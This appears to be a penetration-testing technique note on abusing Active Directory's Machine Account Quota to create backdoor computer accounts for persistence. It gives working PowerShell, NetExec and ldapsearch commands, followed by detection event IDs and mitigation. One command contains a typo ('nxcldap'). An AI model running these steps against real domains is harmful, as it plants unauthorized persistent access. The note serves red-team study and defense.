---
tags:
  - "#type/technique"
  - "#tactic/TA0003"
  - "#technique/T1136.001"
  - "#stage/persistence"
  - "#os/windows"
  - "#tool/powermad"
  - "#tool/impacket"
aliases:
  - Machine Account Quota
  - MachineAccountQuota
  - MAQ
  - Computer Account Creation
---

## Technique
___
The Machine Account Quota (ms-DS-MachineAccountQuota) is an Active Directory attribute that allows non-privileged users to create machine accounts up to the specified quota (default: 10). Attackers can abuse this to create persistent backdoors in the domain.

## Prerequisites
___

**Access Level:** Any domain user account.

**System State:** Default Active Directory configuration (quota > 0).

**Information:** Domain controller name or IP.

## Execution
___

### Windows (PowerView)
```powershell
# Check current quota value
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota

# Create new machine account
New-MachineAccount -MachineAccount Backdoor -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force) -Domain domain.local -DomainController DC1.domain.local

# Verify creation
Get-ADComputer -Identity Backdoor
```

### Linux (NetExec)
```bash
# Check current quota
nxc ldap DC_IP -u user -p password -M maq

# Create machine account
nxcldap DC_IP -u user -p password -M addcomputer -o COMPUTER_NAME=BACKDOOR -o PASSWORD=P@ssw0rd!

# Verify creation
nxc ldap DC_IP -u user -p password -X '(&(objectClass=computer)(name=BACKDOOR*))' base
```

### Linux (ldapsearch)
```bash
# Check quota value
ldapsearch -H ldap://DC_IP -x -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local' '(objectClass=domain)' ms-DS-MachineAccountQuota

# Verify machine account
ldapsearch -H ldap://DC_IP -x -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local' '(&(objectClass=computer)(name=BACKDOOR*))' name
```

## Detection & Mitigation
___

### Detection
- Monitor for `Create/Modify Computer` events (4741-4743) from non-admin users
- Look for unusual machine account creations
- Monitor for LDAP queries checking the MachineAccountQuota attribute

### Mitigation
- Set `ms-DS-MachineAccountQuota` to 0
  ```powershell
  Set-ADDomain -Identity domain.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
  ```
- Monitor and alert on computer account creation
- Implement privileged access workstations (PAWs)
- Use LAPS for local admin password management